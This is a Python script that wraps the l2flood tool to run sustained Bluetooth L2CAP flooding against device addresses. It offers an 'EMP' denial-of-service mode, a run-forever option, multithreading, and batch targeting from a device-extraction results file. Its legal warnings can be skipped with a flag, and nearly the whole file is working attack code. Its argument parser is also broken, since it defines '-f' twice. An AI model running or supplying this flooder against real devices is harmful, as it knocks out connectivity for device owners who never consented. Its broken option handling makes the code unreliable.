#!/usr/bin/env python3
"""
Aggressive L2CAP Stress Tester
Fuzzes extracted BD addresses using l2flood EMP mode (-R flag).

⚠️  READ LEGAL_WARNING.md BEFORE USING THIS TOOL ⚠️

This script performs sustained L2CAP flooding to stress-test Bluetooth devices.
It can disrupt device connectivity and functionality.

Only use on devices you own or have explicit written permission to test.
Unauthorized use is a federal crime.
"""

import subprocess
import sys
import os
import signal
import time
import json
import argparse
from typing import List, Tuple

# Color codes for output
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"


def print_warning(msg: str):
    """Print warning in red."""
    print(f"{RED}⚠️  {msg}{RESET}")


def print_info(msg: str):
    """Print info in yellow."""
    print(f"{YELLOW}[*]{RESET} {msg}")


def check_l2flood() -> bool:
    """Check if l2flood is installed."""
    try:
        subprocess.run(
            ["which", "l2flood"],
            capture_output=True,
            check=True
        )
        return True
    except subprocess.CalledProcessError:
        return False


def build_l2flood() -> bool:
    """Attempt to build l2flood from source if not installed."""
    print_info("l2flood not found. Attempting to build from source...")

    if not os.path.exists("l2flood.c"):
        print_warning("l2flood.c not found in current directory")
        return False

    try:
        subprocess.run(["make"], check=True, capture_output=True)
        subprocess.run(["sudo", "make", "install"], check=True, capture_output=True)
        print_info("Built and installed l2flood")
        return True
    except subprocess.CalledProcessError as e:
        print_warning(f"Failed to build l2flood: {e}")
        return False


def validate_bdaddr(addr: str) -> bool:
    """Validate BD ADDR format."""
    parts = addr.split(":")
    if len(parts) != 6:
        return False
    return all(len(p) == 2 and all(c in "0123456789ABCDEFabcdef" for c in p) for p in parts)


def aggressive_flood(
    addr: str,
    hci_device: str = None,
    duration: int = 60,
    threads: int = None,
    packet_size: int = 600
) -> Tuple[bool, str]:
    """
    Run l2flood with -R flag (EMP mode) for sustained fuzzing.

    Args:
        addr: Target BD ADDR
        hci_device: HCI adapter (e.g., "hci0")
        duration: How long to run in seconds, or None for infinite (until Ctrl+C)
        threads: Number of parallel threads (default: CPU count)
        packet_size: L2CAP payload size

    Returns:
        (success: bool, output: str)
    """
    if not validate_bdaddr(addr):
        return False, f"Invalid BD ADDR: {addr}"

    cmd = ["sudo", "l2flood", "-R"]

    if hci_device:
        cmd.extend(["-i", hci_device])

    if threads:
        cmd.extend(["-n", str(threads)])

    if packet_size:
        cmd.extend(["-s", str(packet_size)])

    cmd.append(addr)

    print_info(f"Starting L2CAP flood against {addr}")
    print_info(f"Mode: EMP (burst-reconnect, sustained DoS)")
    if duration is None:
        print_info(f"Duration: FOREVER (press Ctrl+C to stop)")
    else:
        print_info(f"Duration: {duration}s")
    if threads:
        print_info(f"Threads: {threads}")
    print_info(f"Packet size: {packet_size} bytes")
    print()

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        # Run for specified duration or infinite
        try:
            proc.wait(timeout=duration)
        except subprocess.TimeoutExpired:
            if duration is not None:
                print_info(f"Duration limit reached, terminating flood...")
            proc.send_signal(signal.SIGINT)
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()

        stdout, stderr = proc.communicate()
        output = stdout + stderr

        if proc.returncode == 0 or proc.returncode == -2:  # SIGINT = -2
            return True, output
        else:
            return False, output

    except Exception as e:
        return False, str(e)


def load_results(filepath: str) -> List[dict]:
    """Load extraction results from JSON file."""
    try:
        with open(filepath, 'r') as f:
            return json.load(f)
    except Exception as e:
        print_warning(f"Failed to load {filepath}: {e}")
        return []


def main():
    parser = argparse.ArgumentParser(
        description="Aggressive L2CAP Stress Tester (l2flood EMP mode)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 aggressive_test.py AA:BB:CC:DD:EE:FF
  sudo python3 aggressive_test.py -i hci1 -d 30 AA:BB:CC:DD:EE:FF
  sudo python3 aggressive_test.py -f results.json -t 4        # From extraction results

⚠️  LEGAL WARNING ⚠️
Only test devices you own or have explicit written permission to test.
Unauthorized use is a federal crime.
Read LEGAL_WARNING.md before using this tool.
        """
    )

    parser.add_argument(
        "target",
        nargs="?",
        help="Target BD ADDR (XX:XX:XX:XX:XX:XX) or - to skip and use -f"
    )
    parser.add_argument(
        "-f", "--from-results",
        type=str,
        help="Load targets from Whisper_Bully results.json"
    )
    parser.add_argument(
        "-i", "--hci",
        type=str,
        help="HCI adapter (e.g., hci0)"
    )
    parser.add_argument(
        "-d", "--duration",
        type=int,
        default=None,
        help="Flood duration in seconds (default: 60, or infinite with -f)"
    )
    parser.add_argument(
        "-f", "--forever",
        action="store_true",
        help="Flood forever until Ctrl+C (ignore -d duration)"
    )
    parser.add_argument(
        "-t", "--threads",
        type=int,
        help="Number of parallel threads (default: CPU count)"
    )
    parser.add_argument(
        "-s", "--size",
        type=int,
        default=600,
        help="L2CAP packet payload size (default: 600)"
    )
    parser.add_argument(
        "--no-warn",
        action="store_true",
        help="Skip legal warning (use only if you have authorization)"
    )

    args = parser.parse_args()

    # Show legal warning unless explicitly skipped
    if not args.no_warn:
        print()
        print_warning("=" * 70)
        print_warning("LEGAL & ETHICAL NOTICE")
        print_warning("=" * 70)
        print_warning("")
        print_warning("This tool performs L2CAP flooding. Unauthorized use is a FEDERAL CRIME.")
        print_warning("")
        print_warning("You may ONLY test:")
        print_warning("  - Devices you own")
        print_warning("  - Devices with EXPLICIT WRITTEN permission from the owner")
        print_warning("")
        print_warning("Read LEGAL_WARNING.md for details.")
        print_warning("")
        confirm = input(f"{RED}Do you have authorization to test? Type 'yes' to continue: {RESET}")
        if confirm.lower() != "yes":
            print_warning("Aborted.")
            return

    # Check for root
    if os.geteuid() != 0:
        print_warning("This script requires root. Run with sudo.")
        return

    # Check/build l2flood
    if not check_l2flood():
        if not build_l2flood():
            print_warning("l2flood not found and could not be built.")
            print_warning("Install manually: make && sudo make install")
            return

    targets = []

    # Load from file or command line
    if args.from_results:
        results = load_results(args.from_results)
        if results:
            targets = [(r.get("permanent_address"), r.get("device_name")) for r in results]
            print_info(f"Loaded {len(targets)} device(s) from {args.from_results}")
    elif args.target and args.target != "-":
        if validate_bdaddr(args.target):
            targets = [(args.target, "Unknown")]
        else:
            print_warning(f"Invalid BD ADDR: {args.target}")
            return
    else:
        parser.print_help()
        return

    if not targets:
        print_warning("No targets specified.")
        return

    print()
    print_info(f"Flooding {len(targets)} device(s)")
    print()

    # Set duration based on forever flag
    if args.forever:
        duration = None  # None means infinite
        print_info("Flood mode: FOREVER (until Ctrl+C)")
    else:
        duration = args.duration if args.duration else 60
        print_info(f"Flood mode: {duration} seconds")
    print()

    results = []

    for i, (addr, name) in enumerate(targets, 1):
        print("=" * 70)
        print_info(f"Target {i}/{len(targets)}: {name} ({addr})")
        print("=" * 70)

        success, output = aggressive_flood(
            addr,
            hci_device=args.hci,
            duration=duration,
            threads=args.threads,
            packet_size=args.size
        )

        if success:
            # Parse l2flood output for stats
            stats = {"target_address": addr, "device_name": name, "output": output}
            results.append(stats)
            print_info(f"Flood completed.")
        else:
            print_warning(f"Flood failed: {output[:200]}")

        # Brief pause between targets
        if i < len(targets):
            time.sleep(2)

    print()
    print("=" * 70)
    print_info(f"Flood completed for {len(results)}/{len(targets)} device(s)")
    print("=" * 70)


if __name__ == "__main__":
    main()
